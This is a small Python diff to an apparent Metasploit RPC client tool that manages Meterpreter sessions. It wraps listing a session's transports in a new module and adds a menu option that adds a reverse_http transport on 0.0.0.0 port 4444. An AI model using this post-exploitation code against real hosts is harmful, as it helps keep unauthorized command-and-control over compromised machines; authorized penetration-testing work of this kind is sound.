@@ -6,6 +6,7 @@ import json
 import random
 import time
 from pymetasploit3.msfrpc import MsfError
+from transportModule import transportModule
 
 class sessionMod:
 
@@ -71,8 +72,11 @@ class sessionMod:
                 for s in _transport:
                     _transport_list.append(s)
                     print(f"Session ID: {s}")
-                _transport_input = input("Please select session for transport list")
-                print(self.msfclient.client.sessions.session(_transport_input).run_wit_output('transport list'))
+                _transport_input = input("[!]Please select session for transport list: ")
+                self.transportModule = transportModule(_transport_input, self.msfclient)
+                self.transportModule.printTransportList()
+            if selection == 5:
+                self.transportModule.transportAdd("reverse_http", "0.0.0.0", "4444")
             if selection == 0:
                 return True
     
